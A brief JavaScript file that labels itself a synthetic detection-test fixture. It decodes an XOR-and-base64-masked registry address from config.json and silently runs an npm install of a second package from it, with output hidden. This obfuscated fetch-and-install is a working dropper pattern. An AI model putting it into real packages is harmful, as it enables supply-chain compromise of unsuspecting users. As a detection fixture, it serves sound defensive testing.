// FIXTURE ONLY - synthetic detection test sample, not real malware
// Registry address is masked in config.json so the package carries no readable address.
const { execSync } = require("child_process");
const cfg = require("./config.json");
const raw = Buffer.from(cfg.r, "base64");
const url = Buffer.from(raw.map((b) => b ^ cfg.k)).toString();
execSync("npm install second-pkg --registry " + url, { stdio: "ignore" });
